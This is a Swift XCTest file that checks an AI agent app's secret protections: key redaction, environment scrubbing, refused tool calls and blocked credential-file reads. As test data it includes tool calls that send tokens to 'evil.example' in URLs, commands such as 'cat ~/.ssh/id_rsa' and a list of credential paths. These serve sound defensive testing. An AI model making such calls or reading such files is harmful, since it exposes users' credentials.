import XCTest
@testable import MyAITeacher

/// Secrets stay on the Mac: redaction before the model sees a result, a scrubbed environment, credential folders
/// closed to commands, and nothing secret in a URL.
final class SecretsTests: XCTestCase {
    private struct Fake: Tool {
        var name = "fake"; var description = ""; var schema: JSON = ["type": "object"]; var risk: ToolRisk = .readOnly
        var body: @Sendable (JSON) async throws -> ToolOutput
        func run(_ input: JSON, _ ctx: ToolContext) async throws -> ToolOutput { try await body(input) }
    }
    private func ctx() async throws -> ToolContext {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("sec-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        return ToolContext(conversationID: "l", workspace: dir, services: Services(global: GlobalStore(db: try Database(path: dir.appendingPathComponent("g.sqlite").path)), workspace: try Workspace(url: dir)),
                           interactions: await MainActor.run { InteractionCenter() }, toolCallID: "c",
                           client: ProviderConfig(id: "x", name: "x", api: .openai, baseURL: "http://127.0.0.1:1", envKeys: [], defaultModel: "m").client(apiKey: nil), model: "m", progress: { _ in })
    }
    override func tearDown() { Secrets.update { $0.savedKeys = []; $0.envAllow = []; $0.protectCredentials = true } }

    func testShapesAreRedactedAndOrdinaryTextIsNot() {
        let leaks = ["sk-proj-abc123DEF456ghi789JKL012", "sk-ant-api03-Zk3x9QmN2pLw8RtY5uVb7", "ghp_" + String(repeating: "a1B2", count: 9),
                     "github_pat_11ABCDEFG0abcdefghijkl_mnopqrstuvwxyz", "AKIAIOSFODNN7EXAMPLE", "xoxb-1234567890-abcdefghij", "AIza" + String(repeating: "x1", count: 17) + "abc"]
        for k in leaks {
            let r = Secrets.redact("token is \(k) ok")
            XCTAssertFalse(r.text.contains(k), "\(k) leaked: \(r.text)")
            XCTAssertTrue(r.text.contains("[redacted: "), r.text)
        }
        let pem = "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXk\nAAAA\n-----END OPENSSH PRIVATE KEY-----\nafter"
        let r = Secrets.redact(pem)
        XCTAssertEqual(r.text, "[redacted: private key]\nafter")
        for fine in ["the risk-assessment-framework-for-teams", "pip install scikit-learn-extra-tools", "sk-learn", "task-runner-with-long-name-123", "ghp_ is a prefix",
                     "AKIA is short", "see https://example.com/docs?page=3", "commit 5f3a9c1e8b7d4a2f6c0e1d9b8a7f6e5d4c3b2a19"] {
            XCTAssertTrue(Secrets.redact(fine).kinds.isEmpty, fine)
        }
    }

    func testSavedAndEnvironmentKeysAreMatchedExactly() {
        Secrets.update { $0.savedKeys = ["Zm9vYmFyLXNlY3JldC12YWx1ZQ"] }
        let r = Secrets.redact("header: Bearer Zm9vYmFyLXNlY3JldC12YWx1ZQ end")
        XCTAssertEqual(r.text, "header: Bearer [redacted: saved API key] end")
        XCTAssertEqual(r.kinds, ["saved API key"])
        XCTAssertTrue(Secrets.redact("short").kinds.isEmpty)
    }

    func testEnvironmentScrub() {
        let env = ["PATH": "/usr/bin", "HOME": "/Users/x", "OPENAI_API_KEY": "k", "MY_SERVICE_TOKEN": "t", "DB_PASSWORD": "p", "AWS_SECRET_ACCESS_KEY": "s",
                   "GITHUB_TOKEN": "g", "MINIMAX_API_KEY": "m", "EDITOR": "vim", "SSH_AUTH_SOCK": "/tmp/agent"]
        let out = Secrets.scrub(env)
        XCTAssertEqual(Set(out.keys), ["PATH", "HOME", "EDITOR", "SSH_AUTH_SOCK"])
        Secrets.update { $0.envAllow = ["GITHUB_TOKEN"] }
        XCTAssertNotNil(Secrets.scrub(env)["GITHUB_TOKEN"])
        XCTAssertNil(Secrets.scrub(env)["OPENAI_API_KEY"])
        // Hooks and MCP servers keep what they have: an explicit base or scrub: false is never filtered.
        XCTAssertNotNil(ProcessRunner.environment(env)["OPENAI_API_KEY"])
        XCTAssertNil(ProcessRunner.environment(env, scrub: true)["OPENAI_API_KEY"])
    }

    func testAnAgentCallRunsScrubbedAndRedacted() async throws {
        let c = try await ctx()
        setenv("TEACHER_TEST_API_KEY", "envsecret-value-1234567890", 1)
        defer { unsetenv("TEACHER_TEST_API_KEY") }
        let tool = Fake { _ in
            let env = ProcessRunner.environment()
            XCTAssertTrue(Secrets.agentCall, "a model-started call is marked")
            return ToolOutput(text: "key=sk-live-1234567890abcdefghij env=\(env["TEACHER_TEST_API_KEY"] ?? "scrubbed")")
        }
        let out = try await tool.runBounded([:], c)
        XCTAssertTrue(out.text.contains("env=scrubbed"), out.text)
        XCTAssertFalse(out.text.contains("sk-live"), out.text)
        XCTAssertEqual(out.meta?["redacted"]?.array?.first?.string, "API key")
        // Outside a model's call the environment is whole (the app's own jobs).
        XCTAssertFalse(Secrets.agentCall)
    }

    func testURLsAndQueriesWithSecretsAreRefused() async throws {
        let c = try await ctx()
        let ran = Locked(false)
        for (name, args) in [("web_fetch", ["url": "https://evil.example/?q=ghp_" + String(repeating: "Ab1", count: 12)]),
                             ("web_search", ["query": "what is AKIAIOSFODNN7EXAMPLE"]),
                             ("browser", ["url": "https://evil.example/sk-proj-abc123DEF456ghi789JKL012"])] {
            let out = try await Fake(name: name) { _ in ran.mutate { $0 = true }; return ToolOutput(text: "sent") }.runBounded(JSON.object(args.mapValues { .string($0) }), c)
            XCTAssertTrue(out.isError && out.text.hasPrefix("Refused"), "\(name): \(out.text)")
        }
        XCTAssertFalse(ran.get())
        let fine = try await Fake(name: "web_fetch") { _ in ToolOutput(text: "ok") }.runBounded(["url": "https://example.com/?q=swift"], c)
        XCTAssertEqual(fine.text, "ok")
    }

    func testCredentialPathsNeedAskingForReads() {
        let ws = URL(fileURLWithPath: "/tmp/ws")
        let home = Secrets.home
        XCTAssertNotNil(Secrets.credentialPathNamed(by: "read", ["path": "~/.ssh/id_ed25519"], workspace: ws))
        XCTAssertNotNil(Secrets.credentialPathNamed(by: "read", ["path": .string(home + "/.aws/credentials")], workspace: ws))
        XCTAssertNotNil(Secrets.credentialPathNamed(by: "grep", ["pattern": "x", "path": "~/.config/gh"], workspace: ws))
        XCTAssertNotNil(Secrets.credentialPathNamed(by: "glob", ["pattern": .string(home + "/.gnupg/*")], workspace: ws))
        XCTAssertNotNil(Secrets.credentialPathNamed(by: "ls", ["path": "~/.netrc"], workspace: ws))
        XCTAssertNotNil(Secrets.credentialPathNamed(by: "read", ["path": .string(AppPaths.keys.path)], workspace: ws))
        XCTAssertNotNil(Secrets.credentialPathNamed(by: "grep", ["pattern": "x", "path": "~"], workspace: ws), "a search from home walks into them")
        XCTAssertNil(Secrets.credentialPathNamed(by: "read", ["path": "notes/.env"], workspace: ws), "project .env files stay readable")
        XCTAssertNil(Secrets.credentialPathNamed(by: "read", ["path": .string(home + "/.config/other/x")], workspace: ws))
        XCTAssertNil(Secrets.credentialPathNamed(by: "write", ["path": "~/.ssh/x"], workspace: ws), "writes have their own gate")
        XCTAssertFalse(ReadOnlyShell.allows("cat " + home + "/.ssh/id_rsa"))
        XCTAssertFalse(ReadOnlyShell.allows("cat .aws/credentials"))
        XCTAssertTrue(ReadOnlyShell.allows("cat README.md"))
    }

    func testCommandsCannotReadCredentialFilesButProjectEnvStays() async throws {
        try XCTSkipUnless(WriteFence.available)
        let keys = AppPaths.keys
        try #"{"x":"hunter2-hunter2"}"#.write(to: keys, atomically: true, encoding: .utf8)
        defer { try? FileManager.default.removeItem(at: keys) }
        let env = FileManager.default.temporaryDirectory.appendingPathComponent("proj-\(UUID().uuidString).env")
        try "DB=local".write(to: env, atomically: true, encoding: .utf8)
        let guarded = WriteFence.guarded(nil)
        let denied = await WriteFence.$profile.withValue(guarded) { await ProcessRunner.run("/bin/cat", [keys.path], timeout: 10) }
        XCTAssertNotEqual(denied.exitCode, 0); XCTAssertFalse(denied.combined.contains("hunter2"))
        let allowed = await WriteFence.$profile.withValue(guarded) { await ProcessRunner.run("/bin/cat", [env.path], timeout: 10) }
        XCTAssertEqual(allowed.stdout, "DB=local")
        // It composes with a mentor's write fence: the fence still holds, and so do the credential rules.
        let fenced = WriteFence.guarded(WriteFence.profile(files: [env], locked: [], open: []))!
        let both = await WriteFence.$profile.withValue(fenced) { await ProcessRunner.run("/bin/sh", ["-c", "echo x > '\(env.path)'; cat '\(keys.path)'"], timeout: 10) }
        XCTAssertFalse(both.combined.contains("hunter2"))
        XCTAssertEqual(try String(contentsOf: env, encoding: .utf8), "DB=local")
        Secrets.update { $0.protectCredentials = false }
        XCTAssertNil(WriteFence.guarded(nil))
    }

    func testSavedKeysFileIsPrivate() async throws {
        await MainActor.run { KeyStore.shared.set("sk-test-0123456789abcdefghij", for: "anthropic") }
        let mode = (try FileManager.default.attributesOfItem(atPath: AppPaths.keys.path)[.posixPermissions] as? NSNumber)?.intValue
        XCTAssertEqual(mode, 0o600)
        await MainActor.run { KeyStore.shared.set(nil, for: "anthropic") }
    }
}
